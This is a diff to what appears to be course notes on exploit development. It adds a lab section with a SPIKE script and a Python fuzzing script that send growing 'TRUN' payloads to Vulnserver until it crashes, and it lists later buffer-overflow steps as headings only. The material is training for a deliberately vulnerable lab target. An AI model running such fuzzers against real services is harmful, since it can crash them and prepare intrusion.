@@ -119,21 +119,65 @@
 ### Lec
 - Exploit Development (Buffer Overflows)
 - Buffer Overflows 
-- Spiking 
-- Fuzzing 
-- Find the Offset 
-- Overwriting the EIP 
-- Finding Bad Characters 
-- Finding the Right Mudule
-- Generating Shellcode and Gaining Root
-- Exploit Development
+
 ### Lab
 - LAB Preparation 
   - Windows 10 or 7
     - Vulnserver (https://github.com/stephenbradshaw/vulnserver)
     - Immunity Debugger
   - Kali Linux
-  
+- Spiking 
+  - Kali Linux
+  - Make Spike script
+  - FIND Vulerable Command 
+
+```bash
+# Spike script 
+# nano stats.spk
+s_readline();
+s_string("STATS ");
+s_string_variable("0");
+```
+
+```bash
+# TRY to RUN script
+generic_send_tcp 192.168.x.x 9999 stats.spk 0 0
+```
+
+- Fuzzing 
+  - Python Script for FUZZ
+```python
+#!/usr/bin/python
+#FUZZING Script 
+import sys, socket
+from time import sleep
+buffer = "A" * 100
+# Enter IP Address of your HOST Here!!!!
+HOST = '............'
+PORT = 9999
+
+while True:
+  try:
+    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+    s.connect((HOST,PORT))
+    s.send(('TRUN /. :/' + buffer))
+    s.close()
+    sleep(1)
+    buffer = buffer + "A"*100
+  except:
+    print "Fuzzing crashed at %s bytes" % str(len(buffer))
+    sys.exit()
+
+ ```
+
+- Find the Offset 
+- Overwriting the EIP 
+- Finding Bad Characters 
+- Finding the Right Mudule
+- Generating Shellcode and Gaining Root
+- Exploit Development
+
+
 --- 
 
 ## Week 11@21 Jan 2023
